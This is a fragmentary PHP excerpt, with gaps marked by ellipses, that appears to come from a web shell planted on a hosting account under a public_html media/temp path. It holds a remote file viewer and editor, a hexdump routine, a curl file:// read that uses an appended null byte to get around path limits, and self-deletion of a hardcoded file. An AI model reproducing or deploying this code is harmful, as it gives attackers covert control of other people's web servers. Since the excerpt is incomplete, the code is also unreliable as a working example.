...
<script>
    function myFunction(){document.getElementById('textbase').value = btoa(document.getElementById('textbase').value);} 
    ...
    var p4_ = '".((strpos(@$_POST['p4'],"md")===false)?'':htmlspecialchars($_POST['p4']('/home/k3030889/public_html/media/temp/30b2c088dc63ae3e97ca260cb16a6c68.txt'),ENT_QUOTES)) ."';
...
echo '<form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"><textarea name=text id="textbase" class=bigarea>';
$fp = @fopen($_POST['p1'],'r');
if($fp) {
while( !@feof($fp) )
echo htmlspecialchars(@fread($fp,1024));
...
echo '</textarea><input type=submit id="textbase" onclick="myFunction();" value=">>"></form>';
break;
case 'hexdump':
...
break;
case 3:
$ch = curl_init("file://".$_POST['p2']."\x00".preg_replace('!\(\d+\)\s.*!','','/home/k3030889/public_html/media/temp/30b2c088dc63ae3e97ca260cb16a6c68.txt'));
curl_exec($ch);
break;
case 4:
...
if($_POST['p1'] == 'yes')
if(@unlink(preg_replace('!\(\d+\)\s.*!','','/home/k3030889/public_html/media/temp/30b2c088dc63ae3e97ca260cb16a6c68.txt')))
